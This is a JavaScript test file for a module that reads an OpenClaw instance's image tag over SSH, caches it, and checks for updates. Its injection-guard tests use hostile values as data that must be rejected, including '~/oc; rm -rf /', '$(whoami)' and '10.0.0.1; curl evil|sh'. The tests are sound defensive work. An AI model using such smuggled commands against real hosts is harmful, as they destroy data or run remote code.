'use strict';

// Tests for #296 — reading an OpenClaw instance's version (its pinned image
// tag) from the instance .env over SSH, with caching + input validation.

const { describe, it, beforeEach, afterEach } = require('node:test');
const assert = require('node:assert/strict');
const { exec } = require('node:child_process');
const { promisify } = require('node:util');
const execAsync = promisify(exec);
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');
const { setLevel } = require('../lib/logger');
const { liftDeclaration } = require('./helpers/lift');

setLevel('error');

const ocv = require('../lib/openclaw-version');

describe('openclaw-version (#296)', () => {
  describe('parseVersion', () => {
    it('extracts the tag from an OPENCLAW_IMAGE line', () => {
      assert.equal(
        ocv.parseVersion('OPENCLAW_IMAGE=ghcr.io/openclaw/openclaw:2026.5.28'),
        '2026.5.28'
      );
    });
    it('tolerates quotes, whitespace, and surrounding lines', () => {
      const env = 'FOO=bar\n  OPENCLAW_IMAGE = "ghcr.io/openclaw/openclaw:2026.5.6"\nBAZ=1';
      assert.equal(ocv.parseVersion(env), '2026.5.6');
    });
    it('returns null when absent or bad input', () => {
      assert.equal(ocv.parseVersion('NOPE=1'), null);
      assert.equal(ocv.parseVersion(''), null);
      assert.equal(ocv.parseVersion(null), null);
    });
    it('parses a bare/local image tag without a registry path (#308)', () => {
      // The real-world 'Volta' case: a locally-built image `openclaw:qmd`,
      // no `openclaw/openclaw` registry path. Pre-#308 this returned null.
      assert.equal(ocv.parseVersion('OPENCLAW_IMAGE=openclaw:qmd'), 'qmd');
      assert.equal(ocv.parseVersion('OPENCLAW_IMAGE=openclaw:latest'), 'latest');
    });
    it('parses non-openclaw / custom registry image names (#308)', () => {
      assert.equal(ocv.parseVersion('OPENCLAW_IMAGE=ghcr.io/openclaw/openclaw:2026.5.28'), '2026.5.28');
      assert.equal(ocv.parseVersion('OPENCLAW_IMAGE="myrepo/custom-claw:v1.2"'), 'v1.2');
    });
    it('does not mistake a registry host:port for a tag (#308)', () => {
      // The last colon precedes a `/`, so it's a host:port, not a tag → null.
      assert.equal(ocv.parseVersion('OPENCLAW_IMAGE=registry.local:5000/openclaw/openclaw'), null);
      // ...but a real tag after the port still parses.
      assert.equal(ocv.parseVersion('OPENCLAW_IMAGE=registry.local:5000/openclaw:edge'), 'edge');
    });
    it('returns null for an untagged image reference (#308)', () => {
      assert.equal(ocv.parseVersion('OPENCLAW_IMAGE=openclaw'), null);
    });
  });

  describe('isSafeInstanceDir', () => {
    it('accepts normal paths including a leading ~', () => {
      assert.equal(ocv.isSafeInstanceDir('~/openclaw-tilt'), true);
      assert.equal(ocv.isSafeInstanceDir('/opt/openclaw'), true);
      assert.equal(ocv.isSafeInstanceDir('openclaw'), true);
    });
    it('rejects shell metacharacters, spaces, and empty', () => {
      for (const bad of ['~/oc; rm -rf /', '$(whoami)', '`id`', 'a b', '', 'x|y', 'a&b', '"q"']) {
        assert.equal(ocv.isSafeInstanceDir(bad), false, `should reject: ${bad}`);
      }
    });
  });

  describe('fetchVersion', () => {
    const conn = (over = {}) => ({
      id: 'c1', host: 'h', sshUser: 'u', sshKeyPath: '~/.ssh/k', instanceDir: '~/openclaw', ...over
    });

    beforeEach(() => { ocv._cache.clear(); ocv._inflight.clear(); });
    afterEach(() => { ocv._internal.execAsync = execAsync; ocv._cache.clear(); ocv._inflight.clear(); });

    it('reads + parses the version over SSH and caches it', async () => {
      let calls = 0;
      ocv._internal.execAsync = async () => { calls++; return { stdout: 'OPENCLAW_IMAGE=ghcr.io/openclaw/openclaw:2026.5.28\n' }; };
      const r1 = await ocv.fetchVersion(conn());
      assert.equal(r1.version, '2026.5.28');
      assert.equal(r1.error, null);
      assert.equal(r1.cached, false);
      const r2 = await ocv.fetchVersion(conn());
      assert.equal(r2.version, '2026.5.28');
      assert.equal(r2.cached, true);
      assert.equal(calls, 1, 'second call served from cache (no second ssh)');
    });

    it('force bypasses the cache', async () => {
      let calls = 0;
      ocv._internal.execAsync = async () => { calls++; return { stdout: 'OPENCLAW_IMAGE=ghcr.io/openclaw/openclaw:2026.5.6' }; };
      await ocv.fetchVersion(conn());
      await ocv.fetchVersion(conn(), { force: true });
      assert.equal(calls, 2);
    });

    it('no instanceDir → error and no ssh attempted', async () => {
      let called = false;
      ocv._internal.execAsync = async () => { called = true; return { stdout: '' }; };
      const r = await ocv.fetchVersion(conn({ instanceDir: null }));
      assert.equal(r.version, null);
      assert.match(r.error, /no instanceDir/);
      assert.equal(called, false);
    });

    it('unsafe instanceDir → error and no ssh attempted (injection guard)', async () => {
      let called = false;
      ocv._internal.execAsync = async () => { called = true; return { stdout: '' }; };
      const r = await ocv.fetchVersion(conn({ instanceDir: '~/oc; rm -rf /' }));
      assert.equal(r.version, null);
      assert.match(r.error, /unsafe/);
      assert.equal(called, false);
    });

    it('unsafe host/sshUser/sshKeyPath → error and no ssh attempted (#314 injection guard)', async () => {
      let called = false;
      ocv._internal.execAsync = async () => { called = true; return { stdout: '' }; };
      for (const [field, bad, re] of [
        ['host', '10.0.0.1; curl evil|sh', /host/],
        ['sshUser', 'a$(whoami)', /sshUser/],
        ['sshKeyPath', '~/.ssh/k`id`', /sshKeyPath/]
      ]) {
        const r = await ocv.fetchVersion(conn({ [field]: bad }));
        assert.equal(r.version, null, `${field} should block`);
        assert.match(r.error, re);
      }
      assert.equal(called, false, 'no ssh runs for an unsafe-shaped target');
    });

    it('ssh failure → surfaces an error, no crash', async () => {
      ocv._internal.execAsync = async () => { const e = new Error('boom'); e.stderr = 'conn refused'; throw e; };
      const r = await ocv.fetchVersion(conn());
      assert.equal(r.version, null);
      assert.match(r.error, /ssh read failed/);
    });

    it('image line missing in .env → version null with a reason', async () => {
      ocv._internal.execAsync = async () => ({ stdout: 'SOMETHING=else\n' });
      const r = await ocv.fetchVersion(conn());
      assert.equal(r.version, null);
      assert.match(r.error, /not found/);
    });

    it('does not block the event loop while ssh is pending (hard-reboot hang)', async () => {
      // An unreachable host used to hold execSync for the whole connect
      // timeout, freezing every WebSocket. A timer must run WHILE the read is
      // still unsettled — checking order, not just that the timer ran.
      let release;
      ocv._internal.execAsync = () => new Promise((resolve) => { release = resolve; });
      let settled = false;
      const pending = ocv.fetchVersion(conn());
      pending.then(() => { settled = true; });
      const pendingWhenTimerRan = await new Promise((resolve) => setTimeout(() => resolve(!settled), 5));
      assert.equal(pendingWhenTimerRan, true, 'a timer ran while the ssh read was still in flight');
      release({ stdout: 'OPENCLAW_IMAGE=openclaw:edge' });
      assert.equal((await pending).version, 'edge');
      assert.equal(settled, true);
    });

    it('concurrent callers share one ssh read', async () => {
      let calls = 0;
      const releases = [];
      ocv._internal.execAsync = () => { calls++; return new Promise((resolve) => { releases.push(resolve); }); };
      const a = ocv.fetchVersion(conn());
      const b = ocv.fetchVersion(conn());
      const c = ocv.fetchVersion(conn(), { force: true });
      for (const release of releases) release({ stdout: 'OPENCLAW_IMAGE=openclaw:qmd' });
      const results = await Promise.all([a, b, c]);
      assert.equal(calls, 1, 'one ssh for three concurrent callers');
      for (const r of results) assert.equal(r.version, 'qmd');
      assert.equal(ocv._inflight.size, 0, 'in-flight entry cleared once settled');
    });

    it('a failed read backs off for FAILURE_TTL_MS, then retries; force retries at once', async () => {
      let calls = 0;
      ocv._internal.execAsync = async () => { calls++; throw Object.assign(new Error('timeout'), { stderr: 'no route' }); };
      const r1 = await ocv.fetchVersion(conn());
      const r2 = await ocv.fetchVersion(conn());
      assert.equal(calls, 1, 'a render inside the back-off does not start another ssh');
      assert.equal(r2.cached, true);
      assert.equal(r2.version, null);
      assert.equal(r2.error, r1.error, 'the cached failure still carries its reason');
      await ocv.fetchVersion(conn(), { force: true });
      assert.equal(calls, 2, 'force bypasses the back-off');
      ocv._cache.get('c1').fetchedAt -= ocv.FAILURE_TTL_MS + 1;
      await ocv.fetchVersion(conn());
      assert.equal(calls, 3, 'retried once the back-off lapses');
      assert.ok(ocv.FAILURE_TTL_MS < ocv.TTL_MS);
    });

    it('a successful read is not cut short by the failure back-off', async () => {
      let calls = 0;
      ocv._internal.execAsync = async () => { calls++; return { stdout: 'OPENCLAW_IMAGE=openclaw:edge' }; };
      await ocv.fetchVersion(conn());
      ocv._cache.get('c1').fetchedAt -= ocv.FAILURE_TTL_MS + 1;
      const r = await ocv.fetchVersion(conn());
      assert.equal(calls, 1);
      assert.equal(r.cached, true);
      assert.equal(r.error, null);
    });

    it('a cached "image line missing" result keeps its reason', async () => {
      let calls = 0;
      ocv._internal.execAsync = async () => { calls++; return { stdout: 'SOMETHING=else\n' }; };
      await ocv.fetchVersion(conn());
      const r = await ocv.fetchVersion(conn());
      assert.equal(calls, 1, 'not-found is a real answer, cached for the full TTL');
      assert.equal(r.cached, true);
      assert.equal(r.version, null);
      assert.match(r.error, /not found/);
    });

    it('a read in flight when the connection is invalidated is not cached', async () => {
      let calls = 0;
      const releases = [];
      ocv._internal.execAsync = () => { calls++; return new Promise((resolve) => { releases.push(resolve); }); };
      const stale = ocv.fetchVersion(conn());
      ocv.invalidate('c1'); // connection edited mid-read
      const fresh = ocv.fetchVersion(conn({ instanceDir: '~/openclaw-new' }));
      assert.equal(calls, 2, 'a read after invalidate does not join the stale one');
      releases[0]({ stdout: 'OPENCLAW_IMAGE=openclaw:old' });
      releases[1]({ stdout: 'OPENCLAW_IMAGE=openclaw:new' });
      assert.equal((await stale).version, 'old');
      assert.equal((await fresh).version, 'new');
      assert.equal(ocv._cache.get('c1').version, 'new', 'only the post-invalidate read is cached');
      assert.equal(ocv._inflight.size, 0);
    });

    it('uses the resolved fallback host, not conn.host, when fallbackHosts is set (#1531)', async () => {
      const remote = require('../lib/openclaw-remote');
      const origProbe = remote._internal.probePort;
      remote._internal.probePort = (host) => Promise.resolve(host === 'h2');
      let seenCmd = null;
      ocv._internal.execAsync = async (cmd) => { seenCmd = cmd; return { stdout: 'OPENCLAW_IMAGE=openclaw:edge' }; };
      try {
        const r = await ocv.fetchVersion(conn({ id: 'c-fb', host: 'h1', fallbackHosts: ['h2'] }));
        assert.equal(r.version, 'edge');
        assert.match(seenCmd, /u@h2/, 'the ssh command targets the RESOLVED host, not conn.host');
      } finally {
        remote._internal.probePort = origProbe;
        remote._resolved.delete('c-fb');
      }
    });

    it('invalidates the resolved route on an ssh failure, so the next call re-probes (#1531)', async () => {
      const remote = require('../lib/openclaw-remote');
      const origProbe = remote._internal.probePort;
      remote._internal.probePort = (host) => Promise.resolve(host === 'h2');
      ocv._internal.execAsync = async () => { throw Object.assign(new Error('boom'), { stderr: 'no route' }); };
      try {
        await ocv.fetchVersion(conn({ id: 'c-inv', host: 'h1', fallbackHosts: ['h2'] }));
        assert.equal(remote.getActiveRoute('c-inv'), null, 'the failed route was forgotten, not left cached');
      } finally {
        remote._internal.probePort = origProbe;
        remote._resolved.delete('c-inv');
      }
    });

    it('invalidate(connId) also forgets the resolved route (connection edited)', async () => {
      const remote = require('../lib/openclaw-remote');
      remote._resolved.set('c-edit', { activeHost: 'h2', fallbackUsed: true, resolvedAt: Date.now() });
      ocv.invalidate('c-edit');
      assert.equal(remote.getActiveRoute('c-edit'), null);
    });
  });

  describe('compareOpenclawTags (#297)', () => {
    it('detects an available update for CalVer tags', () => {
      assert.deepEqual(
        ocv.compareOpenclawTags('2026.5.27', '2026.5.28'),
        { comparable: true, updateAvailable: true, currentTag: '2026.5.27', latestTag: '2026.5.28' }
      );
    });
    it('detects no update when current is already latest', () => {
      const r = ocv.compareOpenclawTags('2026.5.28', '2026.5.28');
      assert.equal(r.comparable, true);
      assert.equal(r.updateAvailable, false);
    });
    it('detects an available update for semver tags, with or without a leading v', () => {
      assert.equal(ocv.compareOpenclawTags('v5.70.0', 'v5.71.0').updateAvailable, true);
      assert.equal(ocv.compareOpenclawTags('5.70.0', '5.71.0').updateAvailable, true);
    });
    it('never reports an update when latest is actually OLDER (a rollback tag)', () => {
      const r = ocv.compareOpenclawTags('2026.5.28', '2026.5.27');
      assert.equal(r.comparable, true);
      assert.equal(r.updateAvailable, false);
    });
    it('is honest about non-version tags: comparable false, never a guessed updateAvailable', () => {
      for (const [cur, lat] of [['latest', '2026.5.28'], ['2026.5.28', 'latest'], ['qmd', 'edge']]) {
        const r = ocv.compareOpenclawTags(cur, lat);
        assert.equal(r.comparable, false);
        assert.equal(r.updateAvailable, false);
      }
    });
  });

  describe('checkUpdateAvailable (#297)', () => {
    const conn = (over = {}) => ({ id: 'cu1', host: 'h', sshUser: 'u', sshKeyPath: '~/.ssh/k', instanceDir: '~/openclaw', ...over });
    beforeEach(() => { ocv._cache.clear(); ocv._inflight.clear(); });
    afterEach(() => { ocv._internal.execAsync = execAsync; ocv._cache.clear(); ocv._inflight.clear(); });

    it('combines the current (SSH-read) version with an explicit latestTag', async () => {
      ocv._internal.execAsync = async () => ({ stdout: 'OPENCLAW_IMAGE=openclaw:2026.5.27' });
      const r = await ocv.checkUpdateAvailable(conn(), { latestTag: '2026.5.28' });
      assert.equal(r.currentVersion, '2026.5.27');
      assert.equal(r.latestVersion, '2026.5.28');
      assert.equal(r.updateAvailable, true);
      assert.equal(r.comparable, true);
      assert.equal(r.canRewriteEnv, true, 'instanceDir is shape-safe');
    });

    it('fetches the latest tag via fetchLatestTagImpl when latestTag is not given', async () => {
      ocv._internal.execAsync = async () => ({ stdout: 'OPENCLAW_IMAGE=openclaw:2026.5.27' });
      const r = await ocv.checkUpdateAvailable(conn(), { fetchLatestTagImpl: async () => '2026.5.28' });
      assert.equal(r.latestVersion, '2026.5.28');
      assert.equal(r.updateAvailable, true);
    });

    it('surfaces a fetchLatestTagImpl failure without throwing', async () => {
      ocv._internal.execAsync = async () => ({ stdout: 'OPENCLAW_IMAGE=openclaw:2026.5.27' });
      const r = await ocv.checkUpdateAvailable(conn(), { fetchLatestTagImpl: async () => { throw new Error('registry unreachable'); } });
      assert.equal(r.comparable, false);
      assert.equal(r.updateAvailable, false);
      assert.match(r.error, /registry unreachable/);
    });

    it('is not comparable when the current version could not be read at all', async () => {
      ocv._internal.execAsync = async () => { throw Object.assign(new Error('boom'), { stderr: 'unreachable' }); };
      const r = await ocv.checkUpdateAvailable(conn(), { latestTag: '2026.5.28' });
      assert.equal(r.currentVersion, null);
      assert.equal(r.comparable, false);
      assert.equal(r.updateAvailable, false);
    });

    it('canRewriteEnv is false when the connection has no instanceDir', async () => {
      ocv._internal.execAsync = async () => ({ stdout: 'OPENCLAW_IMAGE=openclaw:2026.5.27' });
      const r = await ocv.checkUpdateAvailable(conn({ id: 'cu2', instanceDir: null }), { latestTag: '2026.5.28' });
      assert.equal(r.canRewriteEnv, false);
    });

    it('falls through to the real default GHCR fetcher when neither latestTag nor fetchLatestTagImpl is given', async () => {
      const origFetch = ocv._internal.fetchImpl;
      ocv._internal.execAsync = async () => ({ stdout: 'OPENCLAW_IMAGE=openclaw:2026.5.27' });
      ocv._internal.fetchImpl = async (url) => {
        if (url.includes('/token')) return { ok: true, json: async () => ({ token: 'tok' }) };
        if (url.includes('/tags/list')) return { ok: true, json: async () => ({ tags: ['2026.5.27', '2026.5.28'] }) };
        return { ok: false };
      };
      try {
        const r = await ocv.checkUpdateAvailable(conn({ id: 'cu3' }));
        assert.equal(r.latestVersion, '2026.5.28');
        assert.equal(r.updateAvailable, true);
      } finally {
        ocv._internal.fetchImpl = origFetch;
      }
    });
  });

  describe('_fetchLatestGhcrTag (#297)', () => {
    const origFetch = ocv._internal.fetchImpl;
    afterEach(() => { ocv._internal.fetchImpl = origFetch; });

    it('picks the highest comparable tag, ignoring non-version tags like latest/qmd', async () => {
      ocv._internal.fetchImpl = async (url) => {
        if (url.includes('/token')) return { ok: true, json: async () => ({ token: 'tok' }) };
        if (url.includes('/tags/list')) return { ok: true, json: async () => ({ tags: ['2026.5.27', 'latest', '2026.5.28', 'qmd'] }) };
        return { ok: false };
      };
      assert.equal(await ocv._fetchLatestGhcrTag(), '2026.5.28');
    });

    it('requests the token endpoint first, then the tags endpoint with the bearer token', async () => {
      const calls = [];
      ocv._internal.fetchImpl = async (url, opts) => {
        calls.push({ url, headers: opts && opts.headers });
        if (url.includes('/token')) return { ok: true, json: async () => ({ token: 'secret-tok' }) };
        return { ok: true, json: async () => ({ tags: ['2026.5.28'] }) };
      };
      await ocv._fetchLatestGhcrTag();
      assert.equal(calls.length, 2);
      assert.match(calls[0].url, /ghcr\.io\/token/);
      assert.match(calls[1].url, /ghcr\.io\/v2\/openclaw\/openclaw\/tags\/list/);
      assert.equal(calls[1].headers.Authorization, 'Bearer secret-tok');
    });

    it('resolves null, never throws, when the token request fails', async () => {
      ocv._internal.fetchImpl = async () => ({ ok: false });
      assert.equal(await ocv._fetchLatestGhcrTag(), null);
    });

    it('resolves null when the tags request fails', async () => {
      ocv._internal.fetchImpl = async (url) => (url.includes('/token')
        ? { ok: true, json: async () => ({ token: 'tok' }) }
        : { ok: false });
      assert.equal(await ocv._fetchLatestGhcrTag(), null);
    });

    it('resolves null on a malformed token body (no token field)', async () => {
      ocv._internal.fetchImpl = async () => ({ ok: true, json: async () => ({}) });
      assert.equal(await ocv._fetchLatestGhcrTag(), null);
    });

    it('resolves null when tags is missing or not an array, rather than throwing', async () => {
      ocv._internal.fetchImpl = async (url) => (url.includes('/token')
        ? { ok: true, json: async () => ({ token: 'tok' }) }
        : { ok: true, json: async () => ({ tags: 'not-an-array' }) });
      assert.equal(await ocv._fetchLatestGhcrTag(), null);
    });

    it('resolves null (never rejects) on a network error or timeout', async () => {
      ocv._internal.fetchImpl = async () => { throw new Error('fetch failed'); };
      assert.equal(await ocv._fetchLatestGhcrTag(), null);
    });
  });

  describe('buildEnvTagUpdateScript (#297)', () => {
    it('builds a script preserving the registry/image path, rewriting only the tag', () => {
      const r = ocv.buildEnvTagUpdateScript('~/openclaw', '2026.5.28');
      assert.equal(r.ok, true);
      assert.match(r.script, /OPENCLAW_IMAGE=.*\):\(/);
      assert.match(r.script, /2026\.5\.28/);
      assert.match(r.script, /~\/openclaw\/\.env/);
    });
    it('refuses an unsafe instanceDir without building a command', () => {
      const r = ocv.buildEnvTagUpdateScript('~/oc; rm -rf /', '2026.5.28');
      assert.equal(r.ok, false);
      assert.equal(r.script, null);
      assert.match(r.error, /instanceDir/);
    });
    it('refuses an unsafe newTag without building a command', () => {
      const r = ocv.buildEnvTagUpdateScript('~/openclaw', 'bad$(whoami)');
      assert.equal(r.ok, false);
      assert.equal(r.script, null);
      assert.match(r.error, /newTag/);
    });
    it('isSafeTag accepts docker-shaped tags and rejects shell metacharacters', () => {
      for (const ok of ['2026.5.28', 'v5.71.0', 'qmd', 'edge-rc1']) assert.equal(ocv.isSafeTag(ok), true, ok);
      for (const bad of ['', 'a;b', 'a b', '$(x)', '`x`']) assert.equal(ocv.isSafeTag(bad), false, bad);
    });
  });

  describe('public/landing.js — _checkOpenclawUpdatesAvailable badge (#297)', () => {
    // public/landing.js is a browser script, not a module — lift the
    // function out of its source text and run it in a vm sandbox with a
    // minimal fake DOM/api/state, the same pattern test/tcc-folders.test.js's
    // wizardCheck() uses.
    const landingSrc = fs.readFileSync(path.join(__dirname, '..', 'public', 'landing.js'), 'utf8');

    /**
     * Run `_checkOpenclawUpdatesAvailable` against a fake DOM/api/state.
     * @param {object[]} connections - `state.openclawConnections`.
     * @param {(url: string) => Promise<object|null>} apiImpl - Fake `api()`.
     * @returns {Promise<{toggles: Map<string, object>}>} Each toggle element the sandbox created.
     */
    async function run(connections, apiImpl) {
      const toggles = new Map();
      /** A minimal fake toggle element: enough of the DOM API the real function uses. */
      function fakeToggle(connId) {
        const badges = [];
        return {
          dataset: { foldKey: connId },
          querySelector: (sel) => (sel === '.oc-update-badge' ? (badges[0] || null) : null),
          appendChild: (el) => { badges.push(el); },
          _badges: badges
        };
      }
      for (const conn of connections) toggles.set(conn.id, fakeToggle(conn.id));

      const ctx = {
        state: { openclawConnections: connections },
        api: apiImpl,
        document: {
          querySelector: (sel) => {
            const m = sel.match(/data-fold-key="([^"]+)"/);
            return m ? (toggles.get(m[1]) || null) : null;
          },
          createElement: () => ({ style: {}, className: '', title: '', textContent: '' })
        }
      };
      vm.createContext(ctx);
      vm.runInContext(liftDeclaration(landingSrc, 'async function _checkOpenclawUpdatesAvailable('), ctx);
      await ctx._checkOpenclawUpdatesAvailable();
      return { toggles };
    }

    it('appends a visible badge when an update is available', async () => {
      const conn = { id: 'conn-1', instanceDir: '~/openclaw' };
      const { toggles } = await run([conn], async (url) => {
        assert.match(url, /\/api\/openclaw\/connections\/conn-1\/update-available/);
        return { updateAvailable: true, latestVersion: '2026.5.28' };
      });
      const badges = toggles.get('conn-1')._badges;
      assert.equal(badges.length, 1);
      assert.match(badges[0].textContent, /2026\.5\.28/);
      assert.match(badges[0].title, /Update available/);
    });

    it('appends no badge when no update is available', async () => {
      const conn = { id: 'conn-2', instanceDir: '~/openclaw' };
      const { toggles } = await run([conn], async () => ({ updateAvailable: false, latestVersion: null }));
      assert.equal(toggles.get('conn-2')._badges.length, 0);
    });

    it('skips a connection with no instanceDir — never calls the API for it', async () => {
      const conn = { id: 'conn-3', instanceDir: null };
      let called = false;
      await run([conn], async () => { called = true; return { updateAvailable: true, latestVersion: 'x' }; });
      assert.equal(called, false);
    });

    it('tolerates api() itself returning null, without throwing', async () => {
      const conn = { id: 'conn-4', instanceDir: '~/openclaw' };
      const { toggles } = await run([conn], async () => null);
      assert.equal(toggles.get('conn-4')._badges.length, 0);
    });

    it('never appends a second badge if called twice against the same (unre-rendered) toggle', async () => {
      const conn = { id: 'conn-5', instanceDir: '~/openclaw' };
      const toggle = { dataset: { foldKey: 'conn-5' }, _badges: [{ className: 'oc-update-badge' }] };
      toggle.querySelector = (sel) => (sel === '.oc-update-badge' ? toggle._badges[0] : null);
      toggle.appendChild = (el) => { toggle._badges.push(el); };
      const ctx = {
        state: { openclawConnections: [conn] },
        api: async () => ({ updateAvailable: true, latestVersion: '2026.5.28' }),
        document: { querySelector: () => toggle, createElement: () => ({ style: {}, className: '', title: '', textContent: '' }) }
      };
      vm.createContext(ctx);
      vm.runInContext(liftDeclaration(landingSrc, 'async function _checkOpenclawUpdatesAvailable('), ctx);
      await ctx._checkOpenclawUpdatesAvailable();
      assert.equal(toggle._badges.length, 1, 'the existing badge check must stop a second one being appended');
    });
  });
});
